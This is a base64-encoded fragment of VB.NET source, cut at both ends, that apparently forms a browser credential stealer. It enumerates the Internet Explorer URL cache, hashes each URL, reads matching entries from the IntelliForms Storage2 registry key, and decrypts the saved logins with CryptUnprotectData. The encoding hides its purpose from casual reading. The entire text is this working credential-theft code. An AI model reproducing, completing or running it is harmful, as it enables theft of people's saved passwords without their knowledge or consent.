QVNIIEFzIFVJbnRlZ2VyID0gKDQgPDwgMTMpDQogICAgUHJpdmF0ZSBDb25zdCBBTEdfVFlQRV9BTlkgQXMgVUludGVnZXIgPSAoMCkNCiAgICBQcml2YXRlIENvbnN0IEFMR19DTEFTU19EQVRBX0VOQ1JZUFQgQXMgVUludGVnZXIgPSAoMyA8PCAxMykNCiAgICBQcml2YXRlIENvbnN0IEFMR19UWVBFX1NUUkVBTSBBcyBVSW50ZWdlciA9ICg0IDw8IDkpDQogICAgUHJpdmF0ZSBDb25zdCBBTEdfVFlQRV9CTE9DSyBBcyBVSW50ZWdlciA9ICgzIDw8IDkpDQoNCiAgICBQcml2YXRlIENvbnN0IEFMR19TSURfREVTIEFzIFVJbnRlZ2VyID0gMQ0KICAgIFByaXZhdGUgQ29uc3QgQUxHX1NJRF9SQzQgQXMgVUludGVnZXIgPSAxDQogICAgUHJpdmF0ZSBDb25zdCBBTEdfU0lEX1JDMiBBcyBVSW50ZWdlciA9IDINCiAgICBQcml2YXRlIENvbnN0IEFMR19TSURfTUQ1IEFzIFVJbnRlZ2VyID0gMw0KICAgIFByaXZhdGUgQ29uc3QgQUxHX1NJRF9TSEEgQXMgVUludGVnZXIgPSA0DQoNCiAgICBQdWJsaWMgQ29uc3QgTVNfREVGX1BST1YgQXMgU3RyaW5nID0gIk1pY3Jvc29mdCBCYXNlIENyeXB0b2dyYXBoaWMgUHJvdmlkZXIgdjEuMCINCg0KICAgIFB1YmxpYyBDb25zdCBQUk9WX1JTQV9GVUxMIEFzIFVJbnRlZ2VyID0gMQ0KICAgICdQdWJsaWMgQ29uc3QgQ1JZUFRfVkVSSUZZQ09OVEVYVCBBcyBVSW50ZWdlciA9ICZIRjAwMDAwMDANCiAgICBQdWJsaWMgQ29uc3QgQ1JZUFRfRVhQT1JUQUJMRSBBcyBVSW50ZWdlciA9ICZIMQ0KDQogICAgUHVibGljIFJlYWRPbmx5IENBTEdfTUQ1IEFzIFVJbnRlZ2VyID0gKEFMR19DTEFTU19IQVNIIE9yIEFMR19UWVBFX0FOWSBPciBBTEdfU0lEX01ENSkNCiAgICBQdWJsaWMgUmVhZE9ubHkgQ0FMR19ERVMgQXMgVUludGVnZXIgPSAoQUxHX0NMQVNTX0RBVEFfRU5DUllQVCBPciBBTEdfVFlQRV9CTE9DSyBPciBBTEdfU0lEX0RFUykNCiAgICBQdWJsaWMgUmVhZE9ubHkgQ0FMR19SQzIgQXMgVUludGVnZXIgPSAoQUxHX0NMQVNTX0RBVEFfRU5DUllQVCBPciBBTEdfVFlQRV9CTE9DSyBPciBBTEdfU0lEX1JDMikNCiAgICBQdWJsaWMgUmVhZE9ubHkgQ0FMR19SQzQgQXMgVUludGVnZXIgPSAoQUxHX0NMQVNTX0RBVEFfRU5DUllQVCBPciBBTEdfVFlQRV9TVFJFQU0gT3IgQUxHX1NJRF9SQzQpDQogICAgRnJpZW5kIENvbnN0IENBTEdfU0hBIEFzIEludGVnZXIgPSAoKDQgPDwgMTMpIE9yIDQpDQoNCiAgICBGcmllbmQgQ29uc3QgSFBfSEFTSFZBTCBBcyBJbnRlZ2VyID0gJkgyDQoNCiAgICA8U3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCk+IF8NCiAgICBQdWJsaWMgU3RydWN0dXJlIFN0cmluZ0luZGV4SGVhZGVyDQogICAgICAgIFB1YmxpYyBkd1dJQ0sgQXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgZHdTdHJ1Y3RTaXplIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIGR3RW50cmllc0NvdW50IEFzIEludGVnZXINCiAgICAgICAgUHVibGljIGR3VW5rSWQgQXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgZHdUeXBlIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIGR3VW5rIEFzIEludGVnZXINCiAgICBFbmQgU3RydWN0dXJlDQoNCiAgICA8U3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCk+IF8NCiAgICBQdWJsaWMgU3RydWN0dXJlIFN0cmluZ0luZGV4RW50cnkNCiAgICAgICAgUHVibGljIGR3RGF0YU9mZnNldCBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBmdEluc2VydERhdGVUaW1lIEFzIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Db21UeXBlcy5GSUxFVElNRQ0KICAgICAgICBQdWJsaWMgZHdEYXRhU2l6ZSBBcyBJbnRlZ2VyDQogICAgRW5kIFN0cnVjdHVyZQ0KDQoNCiAgICBDb25zdCBDcnlwdERsbCBBcyBTdHJpbmcgPSAiYWR2YXBpMzIuZGxsIg0KICAgIENvbnN0IEtlcm5lbERsbCBBcyBTdHJpbmcgPSAia2VybmVsMzIuZGxsIg0KDQogICAgPERsbEltcG9ydChDcnlwdERsbCk+IF8NCiAgICBQdWJsaWMgRnVuY3Rpb24gQ3J5cHRBY3F1aXJlQ29udGV4dChCeVJlZiBwaFByb3YgQXMgSW50UHRyLCBCeVZhbCBwc3pDb250YWluZXIgQXMgU3RyaW5nLCBCeVZhbCBwc3pQcm92aWRlciBBcyBTdHJpbmcsIEJ5VmFsIGR3UHJvdlR5cGUgQXMgVUludGVnZXIsIEJ5VmFsIGR3RmxhZ3MgQXMgVUludGVnZXIpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCg0KICAgIDxEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcjo9VHJ1ZSk+IF8NCiAgICBGcmllbmQgRnVuY3Rpb24gQ3J5cHRHZXRIYXNoUGFyYW0oQnlWYWwgaEhhc2ggQXMgSW50UHRyLCBCeVZhbCBwYXJhbSBBcyBJbnRlZ2VyLCBCeVZhbCBkaWdlc3QgQXMgQnl0ZSgpLCBCeVJlZiBsZW5ndGggQXMgSW50ZWdlciwgQnlWYWwgZmxhZ3MgQXMgSW50ZWdlcikgQXMgQm9vbGVhbg0KICAgIEVuZCBGdW5jdGlvbg0KDQogICAgPERsbEltcG9ydChDcnlwdERsbCk+IF8NCiAgICBQdWJsaWMgRnVuY3Rpb24gQ3J5cHRSZWxlYXNlQ29udGV4dChCeVZhbCBoUHJvdiBBcyBJbnRQdHIsIEJ5VmFsIGR3RmxhZ3MgQXMgVUludGVnZXIpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCg0KICAgIDxEbGxJbXBvcnQoQ3J5cHREbGwpPiBfDQogICAgUHVibGljIEZ1bmN0aW9uIENyeXB0RGVyaXZlS2V5KEJ5VmFsIGhQcm92IEFzIEludFB0ciwgQnlWYWwgQWxnaWQgQXMgVUludGVnZXIsIEJ5VmFsIGhCYXNlRGF0YSBBcyBJbnRQdHIsIEJ5VmFsIGR3RmxhZ3MgQXMgVUludGVnZXIsIEJ5UmVmIHBoS2V5IEFzIEludFB0cikgQXMgQm9vbGVhbg0KICAgIEVuZCBGdW5jdGlvbg0KDQogICAgPERsbEltcG9ydChDcnlwdERsbCk+IF8NCiAgICBQdWJsaWMgRnVuY3Rpb24gQ3J5cHRDcmVhdGVIYXNoKEJ5VmFsIGhQcm92IEFzIEludFB0ciwgQnlWYWwgQWxnaWQgQXMgVUludGVnZXIsIEJ5VmFsIGhLZXkgQXMgSW50UHRyLCBCeVZhbCBkd0ZsYWdzIEFzIFVJbnRlZ2VyLCBCeVJlZiBwaEhhc2ggQXMgSW50UHRyKSBBcyBCb29sZWFuDQogICAgRW5kIEZ1bmN0aW9uDQoNCiAgICA8RGxsSW1wb3J0KENyeXB0RGxsKT4gXw0KICAgIFB1YmxpYyBGdW5jdGlvbiBDcnlwdEhhc2hEYXRhKEJ5VmFsIGhIYXNoIEFzIEludFB0ciwgQnlWYWwgcGJEYXRhIEFzIEludFB0ciwgQnlWYWwgZHdEYXRhTGVuIEFzIEludGVnZXIsIEJ5VmFsIGR3RmxhZ3MgQXMgVUludGVnZXIpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCg0KICAgIDxEbGxJbXBvcnQoQ3J5cHREbGwpPiBfDQogICAgUHVibGljIEZ1bmN0aW9uIENyeXB0RW5jcnlwdChCeVZhbCBoS2V5IEFzIEludFB0ciwgQnlWYWwgaEhhc2ggQXMgSW50UHRyLCBCeVZhbCBGaW5hbCBBcyBCb29sZWFuLCBCeVZhbCBkd0ZsYWdzIEFzIFVJbnRlZ2VyLCBCeVZhbCBwYkRhdGEgQXMgQnl0ZSgpLCBCeVJlZiBwZHdEYXRhTGVuIEFzIFVJbnRlZ2VyLCBfDQogICAgIEJ5VmFsIGR3QnVmTGVuIEFzIFVJbnRlZ2VyKSBBcyBCb29sZWFuDQogICAgRW5kIEZ1bmN0aW9uDQoNCiAgICA8RGxsSW1wb3J0KENyeXB0RGxsKT4gXw0KICAgIFB1YmxpYyBGdW5jdGlvbiBDcnlwdERlY3J5cHQoQnlWYWwgaEtleSBBcyBJbnRQdHIsIEJ5VmFsIGhIYXNoIEFzIEludFB0ciwgQnlWYWwgRmluYWwgQXMgQm9vbGVhbiwgQnlWYWwgZHdGbGFncyBBcyBVSW50ZWdlciwgQnlWYWwgcGJEYXRhIEFzIEJ5dGUoKSwgQnlSZWYgcGR3RGF0YUxlbiBBcyBVSW50ZWdlcikgQXMgQm9vbGVhbg0KICAgIEVuZCBGdW5jdGlvbg0KDQogICAgPERsbEltcG9ydChDcnlwdERsbCk+IF8NCiAgICBQdWJsaWMgRnVuY3Rpb24gQ3J5cHREZXN0cm95SGFzaChCeVZhbCBoSGFzaCBBcyBJbnRQdHIpIEFzIEJvb2xlYW4NCiAgICBFbmQgRnVuY3Rpb24NCg0KICAgIDxEbGxJbXBvcnQoQ3J5cHREbGwpPiBfDQogICAgUHVibGljIEZ1bmN0aW9uIENyeXB0RGVzdHJveUtleShCeVZhbCBoS2V5IEFzIEludFB0cikgQXMgQm9vbGVhbg0KICAgIEVuZCBGdW5jdGlvbg0KDQoNCiAgICA8RGxsSW1wb3J0KCJ3aW5pbmV0LmRsbCIsIFNldExhc3RFcnJvcjo9VHJ1ZSwgQ2hhclNldDo9Q2hhclNldC5BdXRvKT4gXw0KICAgIFB1YmxpYyBGdW5jdGlvbiBGaW5kRmlyc3RVcmxDYWNoZUVudHJ5KDxNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFRTdHIpPiBCeVZhbCBscHN6VXJsU2VhcmNoUGF0dGVybiBBcyBTdHJpbmcsIEJ5VmFsIGxwRmlyc3RDYWNoZUVudHJ5SW5mbyBBcyBJbnRQdHIsIEJ5UmVmIGxwZHdGaXJzdENhY2hlRW50cnlJbmZvQnVmZmVyU2l6ZSBBcyBJbnRlZ2VyKSBBcyBJbnRQdHINCiAgICBFbmQgRnVuY3Rpb24NCg0KDQogICAgPERsbEltcG9ydCgid2luaW5ldC5kbGwiLCBTZXRMYXN0RXJyb3I6PVRydWUsIENoYXJTZXQ6PUNoYXJTZXQuQXV0byk+IF8NCiAgICBQdWJsaWMgRnVuY3Rpb24gRmluZE5leHRVcmxDYWNoZUVudHJ5KEJ5VmFsIGhFbnVtSGFuZGxlIEFzIEludFB0ciwgQnlWYWwgbHBOZXh0Q2FjaGVFbnRyeUluZm8gQXMgSW50UHRyLCBCeVJlZiBscGR3TmV4dENhY2hlRW50cnlJbmZvQnVmZmVyU2l6ZSBBcyBJbnRlZ2VyKSBBcyBCb29sZWFuDQogICAgRW5kIEZ1bmN0aW9uDQoNCiAgICA8RGxsSW1wb3J0KCJ3aW5pbmV0LmRsbCIpPiBfDQogICAgUHVibGljIEZ1bmN0aW9uIEZpbmRDbG9zZVVybENhY2hlKEJ5VmFsIGhFbnVtSGFuZGxlIEFzIEludFB0cikgQXMgQm9vbGVhbg0KICAgIEVuZCBGdW5jdGlvbg0KDQogICAgPERsbEltcG9ydCgiQ3J5cHQzMi5kbGwiLCBTZXRMYXN0RXJyb3I6PVRydWUsIENoYXJTZXQ6PVN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0LkF1dG8pPiBfDQpQcml2YXRlIEZ1bmN0aW9uIENyeXB0VW5wcm90ZWN0RGF0YShCeVJlZiBwRGF0YUluIEFzIERBVEFfQkxPQiwgQnlWYWwgc3pEYXRhRGVzY3IgQXMgSW50ZWdlciwgQnlSZWYgcE9wdGlvbmFsRW50cm9weSBBcyBEQVRBX0JMT0IsIEJ5VmFsIHB2UmVzZXJ2ZWQgQXMgSW50ZWdlciwgQnlWYWwgcFByb21wdFN0cnVjdCBBcyBJbnRlZ2VyLCBCeVZhbCBkd0ZsYWdzIEFzIEludGVnZXIsIEJ5UmVmIHBEYXRhT3V0IEFzIERBVEFfQkxPQikgQXMgQm9vbGVhbg0KICAgIEVuZCBGdW5jdGlvbg0KDQogICAgPFN0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQ6PUNoYXJTZXQuQXV0byk+IF8NCiAgICBQdWJsaWMgU3RydWN0dXJlIElOVEVSTkVUX0NBQ0hFX0VOVFJZX0lORk8NCiAgICAgICAgUHVibGljIGR3U3RydWN0U2l6ZSBBcyBJbnRlZ2VyDQogICAgICAgIDxNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFRTdHIpPiBfDQogICAgICAgIFB1YmxpYyBscHN6U291cmNlVXJsTmFtZSBBcyBbU3RyaW5nXQ0KICAgICAgICA8TWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuTFBUU3RyKT4gXw0KICAgICAgICBQdWJsaWMgbHBzekxvY2FsRmlsZU5hbWUgQXMgW1N0cmluZ10NCiAgICAgICAgUHVibGljIENhY2hlRW50cnlUeXBlIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIGR3VXNlQ291bnQgQXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgZHdIaXRSYXRlIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIGR3U2l6ZUxvdyBBcyBJbnRlZ2VyDQogICAgICAgIFB1YmxpYyBkd1NpemVIaWdoIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIExhc3RNb2RpZmllZFRpbWUgQXMgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNvbVR5cGVzLkZJTEVUSU1FDQogICAgICAgIFB1YmxpYyBFeHBpcmVUaW1lIEFzIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Db21UeXBlcy5GSUxFVElNRQ0KICAgICAgICBQdWJsaWMgTGFzdEFjY2Vzc1RpbWUgQXMgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNvbVR5cGVzLkZJTEVUSU1FDQogICAgICAgIFB1YmxpYyBMYXN0U3luY1RpbWUgQXMgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNvbVR5cGVzLkZJTEVUSU1FDQogICAgICAgIFB1YmxpYyBscEhlYWRlckluZm8gQXMgSW50UHRyDQogICAgICAgIFB1YmxpYyBkd0hlYWRlckluZm9TaXplIEFzIEludGVnZXINCiAgICAgICAgUHVibGljIGxwc3pGaWxlRXh0ZW5zaW9uIEFzIEludFB0cg0KICAgICAgICBQdWJsaWMgZHdFeGVtcHREZWx0YSBBcyBJbnRlZ2VyDQogICAgRW5kIFN0cnVjdHVyZQ0KDQogICAgPFN0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpPiBfDQogICAgUHJpdmF0ZSBTdHJ1Y3R1cmUgREFUQV9CTE9CDQogICAgICAgIFB1YmxpYyBjYkRhdGEgQXMgSW50ZWdlcg0KICAgICAgICBQdWJsaWMgcGJEYXRhIEFzIEludFB0cg0KICAgIEVuZCBTdHJ1Y3R1cmUNCg0KICAgIFB1YmxpYyBJRV9LRVkgQXMgU3RyaW5nID0gIlNvZnR3YXJlXE1pY3Jvc29mdFxJbnRlcm5ldCBFeHBsb3JlclxJbnRlbGxpRm9ybXNcU3RvcmFnZTIiDQoNCiAgICBQdWJsaWMgdmlzaXRlZCBBcyBTdHJpbmcgPSAiIg0KICAgIFB1YmxpYyBpZWRhdGEgQXMgU3RyaW5nID0gIiINCiAgICBDb25zdCBFUlJPUl9OT19NT1JFX0lURU1TIEFzIEludGVnZXIgPSAyNTkNCg0KICAgIFB1YmxpYyBTdWIgZ2V0aWUoKQ0KICAgICAgICBUcnkNCiAgICAgICAgICAgIERpbSBuZWVkZWRCeXRlcyBBcyBJbnRlZ2VyID0gMA0KICAgICAgICAgICAgRmluZEZpcnN0VXJsQ2FjaGVFbnRyeShOb3RoaW5nLCBJbnRQdHIuWmVybywgbmVlZGVkQnl0ZXMpDQogICAgICAgICAgICBJZiBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkgPSBFUlJPUl9OT19NT1JFX0lURU1TIFRoZW4NCiAgICAgICAgICAgICAgICBSZXR1cm4NCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgRGltIGJ1ZmZlckJ5dGVTaXplIEFzIEludGVnZXIgPSBuZWVkZWRCeXRlcw0KICAgICAgICAgICAgRGltIGJ1ZmZlclB0ciBBcyBJbnRQdHIgPSBNYXJzaGFsLkFsbG9jSEdsb2JhbChidWZmZXJCeXRlU2l6ZSkNCiAgICAgICAgICAgIFRyeQ0KICAgICAgICAgICAgICAgIERpbSBoRW51bSBBcyBJbnRQdHIgPSBGaW5kRmlyc3RVcmxDYWNoZUVudHJ5KE5vdGhpbmcsIGJ1ZmZlclB0ciwgbmVlZGVkQnl0ZXMpDQogICAgICAgICAgICAgICAgRGltIHN1Y2Nlc3NmdWwgQXMgQm9vbGVhbg0KICAgICAgICAgICAgICAgIERpbSBjYWNoZUl0ZW0gQXMgSU5URVJORVRfQ0FDSEVfRU5UUllfSU5GTw0KICAgICAgICAgICAgICAgIERvDQogICAgICAgICAgICAgICAgICAgIGNhY2hlSXRlbSA9IERpcmVjdENhc3QoTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShidWZmZXJQdHIsIEdldFR5cGUoSU5URVJORVRfQ0FDSEVfRU5UUllfSU5GTykpLCBJTlRFUk5FVF9DQUNIRV9FTlRSWV9JTkZPKQ0KICAgICAgICAgICAgICAgICAgICBEaW0gdG1wIEFzIFN0cmluZyA9IGNhY2hlSXRlbS5scHN6U291cmNlVXJsTmFtZQ0KICAgICAgICAgICAgICAgICAgICB0bXAgPSB0bXAuVG9Mb3dlcigpDQogICAgICAgICAgICAgICAgICAgIHRtcCA9IHRtcC5TdWJzdHJpbmcodG1wLkluZGV4T2YoIkAiKSArIDEpDQogICAgICAgICAgICAgICAgICAgIElmIHRtcC5JbmRleE9mKCI/IikgPiAwIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIHRtcCA9IHRtcC5TdWJzdHJpbmcoMCwgdG1wLkluZGV4T2YoIj8iKSkNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIERpbSBzSGFzaCBBcyBTdHJpbmcgPSBHZXRTSEExSGFzaCh0bXAsICh0bXAuTGVuZ3RoICsgMSkgKiAyKQ0KICAgICAgICAgICAgICAgICAgICBEaW0gYkhhc2hEYXRhIEFzIEJ5dGUoKSA9IERpcmVjdENhc3QoUmVnaXN0cnkuQ3VycmVudFVzZXIuT3BlblN1YktleShJRV9LRVkpLkdldFZhbHVlKHNIYXNoLCBOb3RoaW5nKSwgQnl0ZSgpKQ0KICAgICAgICAgICAgICAgICAgICBJZiBOb3QgYkhhc2hEYXRhIElzIE5vdGhpbmcgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgTm90IHZpc2l0ZWQuQ29udGFpbnModG1wKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGVjcnlwdENyZWRlbnRpYWwodG1wLCBzSGFzaCwgYkhhc2hEYXRhLkxlbmd0aCwgYkhhc2hEYXRhKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZpc2l0ZWQgKz0gdG1wICsgIiAiDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgdG1wICs9ICIvIg0KICAgICAgICAgICAgICAgICAgICAgICAgRGltIHNIYXNoMiBBcyBTdHJpbmcgPSBHZXRTSEExSGFzaCh0bXAsICh0bXAuTGVuZ3RoICsgMSkgKiAyKQ0KICAgICAgICAgICAgICAgICAgICAgICAgRGltIGJIYXNoRGF0YTIgQXMgQnl0ZSgpID0gRGlyZWN0Q2FzdChSZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3ViS2V5KElFX0tFWSkuR2V0VmFsdWUoc0hhc2gyLCBOb3RoaW5nKSwgQnl0ZSgpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgTm90IGJIYXNoRGF0YTIgSXMgTm90aGluZyBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSWYgTm90IHZpc2l0ZWQuQ29udGFpbnModG1wKSBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlY3J5cHRDcmVkZW50aWFsKHRtcCwgc0hhc2gyLCBiSGFzaERhdGEyLkxlbmd0aCwgYkhhc2hEYXRhMikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmlzaXRlZCArPSB0bXAgKyAiICINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgbmVlZGVkQnl0ZXMgPSBidWZmZXJCeXRlU2l6ZQ0KICAgICAgICAgICAgICAgICAgICBzdWNjZXNzZnVsID0gRmluZE5leHRVcmxDYWNoZUVudHJ5KGhFbnVtLCBidWZmZXJQdHIsIG5lZWRlZEJ5dGVzKQ0KICAgICAgICAgICAgICAgICAgICBJZiBzdWNjZXNzZnVsIE9yRWxzZSBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkgPD4gRVJST1JfTk9fTU9SRV9JVEVNUyBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBOb3Qgc3VjY2Vzc2Z1bCBBbmRBbHNvIG5lZWRlZEJ5dGVzID4gYnVmZmVyQnl0ZVNpemUgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1ZmZlckJ5dGVTaXplID0gbmVlZGVkQnl0ZXMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaW0gZmdmZyBBcyBOZXcgSW50UHRyKGJ1ZmZlckJ5dGVTaXplKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJ1ZmZlclB0ciA9IE1hcnNoYWwuUmVBbGxvY0hHbG9iYWwoYnVmZmVyUHRyLCBmZ2ZnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3NmdWwgPSBUcnVlDQogICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgTG9vcCBXaGlsZSBzdWNjZXNzZnVsDQogICAgICAgICAgICBGaW5hbGx5DQogICAgICAgICAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChidWZmZXJQdHIpDQoNCiAgICAgICAgICAgIEVuZCBUcnkNCiAgICAgICAgICAgIEV4aXQgU3ViDQogICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0KICAgICAgICBFbmQgVHJ5DQoNCiAgICBFbmQgU3ViDQoNCg0KDQogICAgUHVibGljIEZ1bmN0aW9uIEdldFNIQTFIYXNoKEJ5VmFsIHBiRGF0YSBBcyBTdHJpbmcsIEJ5VmFsIGxlbmd0aCBBcyBJbnRlZ2VyKSBBcyBTdHJpbmcNCiAgICAgICAgRGltIGhQcm92IEFzIEludFB0cg0KICAgICAgICBEaW0gSGFzaCBBcyBJbnRQdHINCiAgICAgICAgRGltIGRhdGEgQXMgQnl0ZSgpID0gTmV3IEJ5dGUoMjApIHt9DQogICAgICAgIERpbSBzZGF0YSBBcyBTdHJpbmcgPSAiIg0KICAgICAgICBEaW0gbGVuIEFzIEludGVnZXIgPSAyMA0KICAgICAgICBDcnlwdEFjcXVpcmVDb250ZXh0KGhQcm92LCBOb3RoaW5nLCBOb3RoaW5nLCBQUk9WX1JTQV9GVUxMLCAwKQ0KICAgICAgICBDcnlwdENyZWF0ZUhhc2goaFByb3YsIENBTEdfU0hBLCBJbnRQdHIuWmVybywgMCwgSGFzaCkNCiAgICAgICAgQ3J5cHRIYXNoRGF0YShIYXNoLCBWYXJQdHIocGJEYXRhKSwgbGVuZ3RoLCAwKQ0KICAgICAgICBDcnlwdEdldEhhc2hQYXJhbShIYXNoLCBIUF9IQVNIVkFMLCBkYXRhLCBsZW4sIDApDQogICAgICAgIENyeXB0RGVzdHJveUhhc2goSGFzaCkNCiAgICAgICAgQ3J5cHRSZWxlYXNlQ29udGV4dChoUHJvdiwgMCkNCiAgICAgICAgRGltIGkgQXMgSW50ZWdlciA9IDANCiAgICAgICAgV2hpbGUgaSA8IDIwDQogICAgICAgICAgICBzZGF0YSArPSBTdHJpbmdzLlJpZ2h0KCIwMCIgKyBkYXRhKGkpLlRvU3RyaW5nKCJYIiksIDIpDQogICAgICAgICAgICBTeXN0ZW0uTWF0aC5NYXgoU3lzdGVtLlRocmVhZGluZy5JbnRlcmxvY2tlZC5JbmNyZW1lbnQoaSksIGkgLSAxKQ0KICAgICAgICBFbmQgV2hpbGUNCiAgICAgICAgc2RhdGEgKz0gU3RyaW5ncy5SaWdodCgiMDAiICsgQ2hlY2tTdW0oc2RhdGEpLlRvU3RyaW5nKCJYIiksIDIpDQogICAgICAgIFJldHVybiBzZGF0YQ0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1YmxpYyBGdW5jdGlvbiBDaGVja1N1bShCeVZhbCBzIEFzIFN0cmluZykgQXMgQnl0ZQ0KICAgICAgICBEaW0gc3VtIEFzIEludGVnZXIgPSAwDQogICAgICAgIERpbSBjaGVjayBBcyBCeXRlDQogICAgICAgIERpbSBpIEFzIEludGVnZXIgPSAxDQogICAgICAgIFdoaWxlIGkgPCBzLkxlbmd0aA0KICAgICAgICAgICAgSWYgKGkgTW9kIDIpIDw+IDAgVGhlbg0KICAgICAgICAgICAgICAgIHN1bSArPSBDb252ZXJ0LlRvSW50MzIoQ29udmVyc2lvbi5WYWwoIiZIIiArIFN0cmluZ3MuTWlkKHMsIGksIDIpKSkNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgU3lzdGVtLk1hdGguTWF4KFN5c3RlbS5UaHJlYWRpbmcuSW50ZXJsb2NrZWQuSW5jcmVtZW50KGkpLCBpIC0gMSkNCiAgICAgICAgRW5kIFdoaWxlDQogICAgICAgIGNoZWNrID0gQ29udmVydC5Ub0J5dGUoc3VtIE1vZCAyNTYpDQogICAgICAgIFJldHVybiBjaGVjaw0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1YmxpYyBTdWIgRGVjcnlwdENyZWRlbnRpYWwoQnlWYWwgc1VSTCBBcyBTdHJpbmcsIEJ5VmFsIHNIYXNoIEFzIFN0cmluZywgQnlWYWwgTGVuZ3RoIEFzIEludGVnZXIsIEJ5VmFsIGRhdGEgQXMgQnl0ZSgpKQ0KICAgICAgICBEaW0gZGF0YUluIEFzIE5ldyBEQVRBX0JMT0IoKQ0KICAgICAgICBEaW0gZGF0YU91dCBBcyBOZXcgREFUQV9CTE9CKCkNCiAgICAgICAgRGltIGRhdGFFeHRyYSBBcyBOZXcgREFUQV9CTE9CKCkNCiAgICAgICAgRGltIGhIZWFkZXIgQXMgTmV3IFN0cmluZ0luZGV4SGVhZGVyKCkNCiAgICAgICAgRGltIGhFbnRyeSBBcyBOZXcgU3RyaW5nSW5kZXhFbnRyeSgpDQogICAgICAgIERpbSBuZXdwdHIgQXMgSW50UHRyID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwoTGVuZ3RoKQ0KICAgICAgICBNYXJzaGFsLkNvcHkoZGF0YSwgMCwgbmV3cHRyLCBMZW5ndGgpDQogICAgICAgIGRhdGFJbi5jYkRhdGEgPSBMZW5ndGgNCiAgICAgICAgZGF0YUluLnBiRGF0YSA9IG5ld3B0cg0KICAgICAgICBkYXRhRXh0cmEuY2JEYXRhID0gKHNVUkwuTGVuZ3RoICsgMSkgKiAyDQogICAgICAgIGRhdGFFeHRyYS5wYkRhdGEgPSBWYXJQdHIoc1VSTCkNCiAgICAgICAgSWYgQ3J5cHRVbnByb3RlY3REYXRhKGRhdGFJbiwgMCwgZGF0YUV4dHJhLCAwLCAwLCAwLCBfDQogICAgICAgICBkYXRhT3V0KSBUaGVuDQogICAgICAgICAgICBEaW0gcHRyRGF0YSBBcyBOZXcgSW50UHRyKGRhdGFPdXQucGJEYXRhLlRvSW50MzIoKSArIE1hcnNoYWwuUmVhZEJ5dGUoZGF0YU91dC5wYkRhdGEpKQ0KICAgICAgICAgICAgaEhlYWRlciA9IERpcmVjdENhc3QoTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShwdHJEYXRhLCBoSGVhZGVyLltHZXRUeXBlXSgpKSwgU3RyaW5nSW5kZXhIZWFkZXIpDQogICAgICAgICAgICBJZiBoSGVhZGVyLmR3VHlwZSA9IDEgQW5kQWxzbyBoSGVhZGVyLmR3RW50cmllc0NvdW50ID49IDIgVGhlbg0KICAgICAgICAgICAgICAgIERpbSBlbnRyeURhdGEgQXMgTmV3IEludF